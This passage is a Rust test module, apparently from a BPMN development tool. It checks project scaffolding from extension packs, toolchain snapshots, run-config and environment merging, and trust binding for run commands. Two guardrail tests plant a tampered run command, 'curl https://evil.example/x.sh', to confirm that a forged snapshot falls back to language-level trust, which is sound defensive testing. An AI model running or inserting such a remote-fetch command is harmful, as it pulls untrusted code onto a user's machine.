            !dir.join(".nanobpm/worker-sdk.ts").exists(),
            ".nanobpm/worker-sdk.ts leaked"
        );
        assert!(
            !dir.join("workers/do-work").exists(),
            "workers/do-work leaked"
        );
        assert!(
            !dir.join("resources/processes/jbench.bpmn").exists(),
            "built-in starter BPMN shadowed the pack BPMN"
        );
    }

    /// Regression for the "Java template creates a Deno app" bug: the
    /// extensions root ALWAYS holds non-pack entries in real installs — the
    /// trust store (trust.json), `.DS_Store`, a mid-install tarball — and
    /// template_source() used to abort its whole scan on the first one,
    /// so create_project silently fell back to the built-in Deno starter.
    /// With litter present, an installed example pack must still scaffold.
    #[test]
    fn pack_template_survives_stray_files_in_extensions_root() {
        let _g = lock();
        let root = temp_root();
        let ext = root.join("ext-store");
        std::fs::create_dir_all(&ext).unwrap();
        // The litter, named to sort BEFORE the pack dir in any readdir order
        // that happens to be alphabetical (real-world order is arbitrary).
        std::fs::write(ext.join(".DS_Store"), b"\x00\x01").unwrap();
        std::fs::write(ext.join("a-leftover-0.0.1.tgz"), b"gz").unwrap();
        std::fs::write(ext.join("trust.json"), r#"{"yolo":false,"approved":[]}"#).unwrap();
        let pack = ext.join("nanobpm__nano-ide-example-java-throughput");
        std::fs::create_dir_all(pack.join("app/src/main/java")).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"java-throughput","kind":"example","displayName":"Java throughput",
                 "requires":["java"],"appDir":"app"}"#,
        )
        .unwrap();
        std::fs::write(pack.join("app/pom.xml"), "<project/>\n").unwrap();
        std::fs::write(pack.join("app/src/main/java/Main.java"), "class Main{}\n").unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
        let cfg = create_project("jt", "", "java-throughput").expect("create");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        assert_eq!(
            cfg.lang, "java",
            "lang must come from the pack, not the Deno fallback"
        );
        let dir = root.join("jt");
        assert!(dir.join("pom.xml").is_file(), "pack files must be copied");
        assert!(dir.join("src/main/java/Main.java").is_file());
        assert!(
            !dir.join("main.ts").exists(),
            "must not fall back to the Deno starter"
        );
        assert!(!dir.join("deno.json").exists());
    }

    /// A LANG pack's own starter template (e.g. lang-java's `java-starter`)
    /// implies the pack itself as the project language — lang packs don't
    /// declare `requires`, so the old requires-only derivation left these
    /// projects on the Deno runtime.
    #[test]
    fn lang_pack_template_sets_lang_to_the_pack_id() {
        let _g = lock();
        let root = temp_root();
        let ext = root.join("ext-store");
        let pack = ext.join("nanobpm__nano-ide-lang-java");
        std::fs::create_dir_all(pack.join("templates/java-starter")).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"java","kind":"lang","displayName":"Java",
                 "templates":[{"id":"java-starter","label":"Starter (Java / Maven)"}]}"#,
        )
        .unwrap();
        std::fs::write(pack.join("templates/java-starter/pom.xml"), "<project/>\n").unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
        let cfg = create_project("jstart", "", "java-starter").expect("create");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        assert_eq!(cfg.lang, "java");
        assert_eq!(cfg.main, "pom.xml");
        assert!(root.join("jstart/pom.xml").is_file());
    }

    /// Regression: when a pack ships an aggregator `pom.xml` alongside a
    /// module `microservice/pom.xml`, `cfg.main` must point at the module
    /// POM (most specific) rather than the aggregator.
    #[test]
    fn multi_module_java_pack_prefers_module_pom_over_root_pom() {
        let _g = lock();
        let root = temp_root();
        let ext = root.join("ext-store");
        let pack = ext.join("nanobpm__app-embedded-multi");
        std::fs::create_dir_all(pack.join("templates/multi-starter/microservice")).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"multi","kind":"app","displayName":"Multi","requires":["java","maven"],"templates":[{"id":"multi-starter","label":"Multi starter"}]}"#,
        )
        .unwrap();
        std::fs::write(
            pack.join("templates/multi-starter/pom.xml"),
            "<aggregator/>\n",
        )
        .unwrap();
        std::fs::write(
            pack.join("templates/multi-starter/microservice/pom.xml"),
            "<module/>\n",
        )
        .unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
        let cfg = create_project("multiproj", "", "multi-starter").expect("create");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        assert_eq!(cfg.main, "microservice/pom.xml");
    }

    /// A pack-scaffolded project snapshots its toolchain into `cfg.toolchain`
    /// and records the source pack in `cfg.scaffolded_from`. This is what
    /// decouples running projects from pack updates/uninstalls.
    #[test]
    fn pack_scaffold_snapshots_toolchain_into_project() {
        let _g = lock();
        let root = temp_root();
        let ext = root.join("ext-store");
        let pack = ext.join("nanobpm__app-embedded-jvm");
        std::fs::create_dir_all(pack.join("templates/embedded-jvm-starter/microservice")).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"embedded-jvm","kind":"app","displayName":"Embedded JVM","requires":["java"],
                 "templates":[{"id":"embedded-jvm-starter","label":"KYC"}],
                 "toolchain":{
                     "run":["mvn","-q","-f","microservice/pom.xml","exec:java"],
                     "compile":["mvn","-q","-f","microservice/pom.xml","-DskipTests","package"]}}"#,
        )
        .unwrap();
        std::fs::write(pack.join("package.json"), r#"{"version":"1.0.1"}"#).unwrap();
        std::fs::write(
            pack.join("templates/embedded-jvm-starter/microservice/pom.xml"),
            "<project/>\n",
        )
        .unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
        let cfg = create_project("kyc", "", "embedded-jvm-starter").expect("create");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let tc = cfg
            .toolchain
            .as_ref()
            .expect("toolchain must be snapshotted");
        assert_eq!(
            tc.run,
            vec!["mvn", "-q", "-f", "microservice/pom.xml", "exec:java"]
        );
        assert_eq!(
            tc.compile,
            vec![
                "mvn",
                "-q",
                "-f",
                "microservice/pom.xml",
                "-DskipTests",
                "package"
            ]
        );
        let src = cfg
            .scaffolded_from
            .as_ref()
            .expect("scaffoldedFrom must be recorded");
        assert_eq!(src.pack, "embedded-jvm");
        assert_eq!(src.version.as_deref(), Some("1.0.1"));
        // Snapshot survives round-trip through disk.
        let reread = read_config("kyc").expect("read_config");
        assert_eq!(reread.toolchain, cfg.toolchain);
        assert_eq!(reread.scaffolded_from, cfg.scaffolded_from);
    }

    /// The resolver picks project snapshot > lang pack > None (built-in Deno).
    /// A pack-scaffolded project runs even if the source pack has been
    /// uninstalled since — the whole point of snapshotting.
    #[test]
    fn resolve_run_argv_prefers_project_snapshot_over_lang_pack() {
        let _g = lock();
        let ext = temp_root().join("ext-store");
        let pack = ext.join("nanobpm__app-embedded-jvm");
        std::fs::create_dir_all(&pack).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"embedded-jvm","kind":"app","displayName":"Embedded JVM",
                 "toolchain":{"run":["mvn","-f","microservice/pom.xml"],"compile":[]}}"#,
        )
        .unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };

        let mut cfg = ProjectConfig::new("p", "");
        cfg.lang = "java".to_string();
        cfg.toolchain = Some(ProjectToolchain {
            run: vec!["mvn".into(), "-f".into(), "microservice/pom.xml".into()],
            compile: vec![],
            run_configs: vec![],
            active_run_config: None,
        });
        cfg.scaffolded_from = Some(ScaffoldedFrom {
            pack: "embedded-jvm".into(),
            version: None,
        });
        let (argv, trust) = resolve_run_argv(&cfg).expect("snapshot must resolve");
        assert_eq!(argv, vec!["mvn", "-f", "microservice/pom.xml"]);
        // Trust binds to the source pack — the installed manifest still
        // declares the identical argv, so approving `embedded-jvm` covers
        // the project's snapshotted invocation.
        assert_eq!(trust, "embedded-jvm");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    /// Guardrail against a user-editable `nanobpm.project.json` claiming
    /// `scaffoldedFrom.pack = <already-trusted-pack>` while the snapshot argv
    /// does not match anything the pack actually declares. In that case the
    /// trust binding must fall back to `cfg.lang` so the user is forced to
    /// explicitly approve the unfamiliar command.
    #[test]
    fn resolve_run_argv_snapshot_mismatch_falls_back_to_lang() {
        let _g = lock();
        let ext = temp_root().join("ext-store");
        let pack = ext.join("nanobpm__app-embedded-jvm");
        std::fs::create_dir_all(&pack).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"embedded-jvm","kind":"app","displayName":"Embedded JVM",
                 "toolchain":{"run":["mvn","-f","microservice/pom.xml","exec:java"],"compile":[]}}"#,
        )
        .unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };

        let mut cfg = ProjectConfig::new("p", "");
        cfg.lang = "java".to_string();
        // Tampered snapshot: claims embedded-jvm scaffolded it but the argv
        // is not what the installed pack declares.
        cfg.toolchain = Some(ProjectToolchain {
            run: vec!["curl".into(), "https://evil.example/x.sh".into()],
            compile: vec![],
            run_configs: vec![],
            active_run_config: None,
        });
        cfg.scaffolded_from = Some(ScaffoldedFrom {
            pack: "embedded-jvm".into(),
            version: None,
        });
        let (_argv, trust) = resolve_run_argv(&cfg).expect("resolves");
        assert_eq!(trust, "java", "trust must not credit tampered snapshot");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    /// A plain Deno project (no snapshot, `lang=deno`) resolves to `None` so
    /// the caller falls through to the built-in Deno runner — no regression.
    #[test]
    fn resolve_run_argv_none_for_plain_deno_project() {
        let cfg = ProjectConfig::new("p", "");
        assert!(resolve_run_argv(&cfg).is_none());
        assert!(resolve_compile_argv(&cfg).is_none());
    }

    // ---- run-configs (issue #42) -------------------------------------------

    fn tc_with_configs(configs: Vec<ProjectRunConfig>) -> ProjectToolchain {
        ProjectToolchain {
            run: vec!["mvn".into(), "-q".into()],
            compile: vec!["mvn".into(), "-DskipTests".into(), "package".into()],
            run_configs: configs,
            active_run_config: None,
        }
    }

    fn rc(id: &str, def: bool, arg: &str) -> ProjectRunConfig {
        ProjectRunConfig {
            id: id.into(),
            label: id.into(),
            default: def,
            run: vec!["mvn".into(), format!("-P{arg}"), "exec:java".into()],
            compile: vec!["mvn".into(), format!("-P{arg}"), "package".into()],
            env: [("PROFILE".into(), arg.into())].into_iter().collect(),
        }
    }

    #[test]
    fn active_run_config_prefers_explicit_pin_over_default_flag() {
        let mut tc = tc_with_configs(vec![rc("a", true, "stock"), rc("b", false, "falcon")]);
        tc.active_run_config = Some("b".into());
        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("b"));
    }

    #[test]
    fn active_run_config_falls_back_to_default_flag_then_first() {
        // With no pin, the `default: true` entry wins even when it isn't first.
        let tc = tc_with_configs(vec![rc("a", false, "stock"), rc("b", true, "falcon")]);
        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("b"));
        // With no default flagged, the first entry wins.
        let tc = tc_with_configs(vec![rc("a", false, "stock"), rc("b", false, "falcon")]);
        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("a"));
    }

    #[test]
    fn active_run_config_none_for_empty_list() {
        let tc = tc_with_configs(vec![]);
        assert!(active_run_config(&tc).is_none());
    }

    #[test]
    fn resolve_run_argv_prefers_active_run_config_over_flat_run() {
        let mut cfg = ProjectConfig::new("p", "");
        cfg.lang = "java".into();
        cfg.toolchain = Some(tc_with_configs(vec![
            rc("stock-rest", true, "stock"),
            rc("falcon-nano", false, "falcon"),
        ]));
        cfg.toolchain.as_mut().unwrap().active_run_config = Some("falcon-nano".into());
        let (argv, _trust) = resolve_run_argv(&cfg).expect("resolves");
        assert!(
            argv.contains(&"-Pfalcon".into()),
            "picked argv should come from active run config, got: {argv:?}"
        );
    }

    #[test]
    fn resolve_run_env_returns_active_run_config_env() {
        let mut cfg = ProjectConfig::new("p", "");
        cfg.toolchain = Some(tc_with_configs(vec![rc("falcon", true, "falcon")]));
        let env = resolve_run_env(&cfg);
        assert_eq!(env.get("PROFILE").map(|s| s.as_str()), Some("falcon"));
    }

    #[test]
    fn resolve_run_env_empty_without_run_configs() {
        let mut cfg = ProjectConfig::new("p", "");
        cfg.lang = "java".into();
        cfg.toolchain = Some(ProjectToolchain {
            run: vec!["mvn".into()],
            compile: vec![],
            run_configs: vec![],
            active_run_config: None,
        });
        assert!(resolve_run_env(&cfg).is_empty());
    }

    #[test]
    fn resolve_run_env_merges_project_env_under_run_config_env() {
        // Project env provides the base (CAMUNDA_REST_ADDRESS pointing at the
        // user's chosen gateway); run config env can *override* a project-level
        // key but a project-only key must survive. This is the whole point of
        // exposing project env — so a user can set the gateway URL once and
        // have every run config inherit it.
        let mut cfg = ProjectConfig::new("p", "");
        cfg.env.insert(
            "CAMUNDA_REST_ADDRESS".into(),
            "http://localhost:8081".into(),
        );
        cfg.env.insert("PROJECT_ONLY".into(), "kept".into());
        cfg.toolchain = Some(tc_with_configs(vec![rc("falcon", true, "falcon")]));
        let env = resolve_run_env(&cfg);
        assert_eq!(env.get("PROJECT_ONLY").map(String::as_str), Some("kept"));
        assert_eq!(env.get("PROFILE").map(String::as_str), Some("falcon"));
        assert_eq!(
            env.get("CAMUNDA_REST_ADDRESS").map(String::as_str),
            Some("http://localhost:8081"),
            "run config didn't override this key so project env wins"
        );
    }

    #[test]
    fn resolve_run_env_run_config_overrides_project_env() {
        let mut cfg = ProjectConfig::new("p", "");
        cfg.env.insert("PROFILE".into(), "project-default".into());
        cfg.toolchain = Some(tc_with_configs(vec![rc("falcon", true, "falcon")]));
        let env = resolve_run_env(&cfg);
        assert_eq!(env.get("PROFILE").map(String::as_str), Some("falcon"));
    }

    #[test]
    fn resolve_run_env_project_env_alone_without_run_configs() {
        let mut cfg = ProjectConfig::new("p", "");
        cfg.env
            .insert("NANOBPMN_BASE_URL".into(), "http://x:1234".into());
        let env = resolve_run_env(&cfg);
        assert_eq!(
            env.get("NANOBPMN_BASE_URL").map(String::as_str),
            Some("http://x:1234")
        );
    }

    #[test]
    fn snapshot_trust_id_for_config_credits_pack_when_config_argv_matches() {
        let _g = lock();
        let ext = temp_root().join("ext-store");
        let pack = ext.join("nanobpm__example-java-throughput");
        std::fs::create_dir_all(&pack).unwrap();
        std::fs::write(
            pack.join("nano-ide.ext.json"),
            r#"{"id":"java-throughput","kind":"example","displayName":"T",
                 "toolchain":{"runConfigs":[
                   {"id":"stock","label":"Stock","run":["mvn","-Pstock","exec:java"]}
                 ]}}"#,
        )
        .unwrap();
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };

        let mut cfg = ProjectConfig::new("p", "");
        cfg.lang = "java".into();
        cfg.scaffolded_from = Some(ScaffoldedFrom {
            pack: "java-throughput".into(),
            version: None,
        });
        let argv = vec!["mvn".into(), "-Pstock".into(), "exec:java".into()];
        assert_eq!(
            snapshot_trust_id_for_config(&cfg, &argv, ArgvKind::Run),
            "java-throughput",
            "pack still declares this argv on a runConfig → trust binds to it",
        );
        // Tampered / hand-edited argv: falls back to lang trust.
        let tampered = vec!["curl".into(), "evil".into()];
        assert_eq!(
            snapshot_trust_id_for_config(&cfg, &tampered, ArgvKind::Run),
            "java",
        );
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn create_scaffolds_a_runnable_project() {
        let _g = lock();
        let root = temp_root();
        let cfg = create_project("demo", "a demo", "starter").expect("create");
        assert_eq!(cfg.name, "demo");
        assert_eq!(cfg.deploy_target, "http://localhost:8080");
        // Built-in scaffold: the template id is recorded, but `scaffolded_from`
        // stays None — its absence marks the template as built-in on the card.
        assert_eq!(cfg.template.as_deref(), Some("starter"));
        assert!(cfg.scaffolded_from.is_none());
        // An unknown template falls through to the starter scaffold, so that's
        // what gets recorded.
        let g = create_project("guess", "", "no-such-template").expect("create");
        assert_eq!(g.template.as_deref(), Some("starter"));
        // The tile summary surfaces the language + template breadcrumb.
        let summary = list_projects()
            .unwrap()
            .into_iter()
            .find(|p| p.name == "demo")
            .expect("demo listed");
        assert_eq!(summary.lang, "deno");
        assert_eq!(summary.template.as_deref(), Some("starter"));
        assert!(summary.scaffolded_from.is_none());
        let dir = root.join("demo");
        assert!(dir.join("main.ts").is_file());
        assert!(dir.join("deno.json").is_file());
        assert!(dir.join(CONFIG_FILE).is_file());
        assert!(dir.join(".nanobpm/worker-sdk.ts").is_file());
        assert!(dir.join("resources/processes/demo.bpmn").is_file());
        assert!(dir.join("workers/do-work/worker.ts").is_file());
        // Idempotency guard.
        assert!(create_project("demo", "", "starter").is_err());
    }

    #[test]
    fn throughput_template_scaffolds_demo_files() {
        let _g = lock();
        let root = temp_root();
        create_project("bench", "", "throughput").expect("create");
        let dir = root.join("bench");
        assert!(dir.join("main.ts").is_file());
        assert!(dir.join("resources/processes/throughput.bpmn").is_file());
        assert!(dir.join("workers/tick/worker.ts").is_file());
        assert!(!dir.join("workers/do-work").exists());
    }

    #[test]
    fn throughput_stream_template_scaffolds_sdk_demo() {
        let _g = lock();
        let root = temp_root();
        create_project("bench-stream", "", "throughput-stream").expect("create");
        let dir = root.join("bench-stream");
        assert!(dir.join("main.ts").is_file());
        assert!(dir.join("resources/processes/throughput.bpmn").is_file());
        assert!(!dir.join("workers/tick").exists());
        let main = std::fs::read_to_string(dir.join("main.ts")).unwrap();
        assert!(main.contains("@nanobpm/nano-sdk") && main.contains("createCamundaClient"));
        let deno = std::fs::read_to_string(dir.join("deno.json")).unwrap();
        assert!(deno.contains("@nanobpm/nano-sdk"));
    }

    #[test]
    fn lists_projects_with_counts() {
        let _g = lock();
        let _root = temp_root();
        create_project("alpha", "", "starter").unwrap();
        let list = list_projects().unwrap();
        let alpha = list.iter().find(|p| p.name == "alpha").unwrap();
        assert_eq!(alpha.processes, 1);
        assert_eq!(alpha.workers, 1);
    }

    #[test]
    fn file_tree_hides_dotdirs_and_nests() {
        let _g = lock();
        let _root = temp_root();
        create_project("tree", "", "starter").unwrap();
        let nodes = file_tree("tree").unwrap();
        assert!(nodes.iter().all(|n| !n.name.starts_with('.')));
        let resources = nodes.iter().find(|n| n.name == "resources").unwrap();
        assert_eq!(resources.kind, "dir");
        assert!(resources.children.is_some());
    }

    #[test]
    fn export_zip_bundles_the_project() {
        let _g = lock();
        let _root = temp_root();
        create_project("ziptest", "", "starter").unwrap();
        let zip = export_zip("ziptest", false).expect("zip");
        // Local file header signature.
        assert_eq!(&zip[0..4], &[0x50, 0x4b, 0x03, 0x04]);
        // Nested under the project name.
        let blob = String::from_utf8_lossy(&zip);
        assert!(blob.contains("ziptest/main.ts"));
    }

    #[test]
    fn config_roundtrips() {
        let _g = lock();
        let _root = temp_root();
        let mut cfg = create_project("cfg", "", "starter").unwrap();
        cfg.deploy_target = "http://example.test:9999".into();
        cfg.platforms = vec!["aarch64-apple-darwin".into()];
        write_config("cfg", &cfg).unwrap();
        let back = read_config("cfg").unwrap();
        assert_eq!(back.deploy_target, "http://example.test:9999");
        assert_eq!(back.platforms, vec!["aarch64-apple-darwin".to_string()]);
    }

    #[test]
    fn rename_moves_project_and_updates_config() {
        let _g = lock();
        let _root = temp_root();
        create_project("oldname", "", "starter").unwrap();
        let cfg = rename_project("oldname", "newname").unwrap();
        assert_eq!(cfg.name, "newname");
        assert!(project_dir("newname").unwrap().is_dir());
        assert!(!project_dir("oldname").unwrap().exists());
        assert_eq!(read_config("newname").unwrap().name, "newname");
        // Collision and missing-source are rejected.
        create_project("other", "", "starter").unwrap();
        assert!(rename_project("newname", "other").is_err());
        assert!(rename_project("ghost", "fresh").is_err());
    }
}
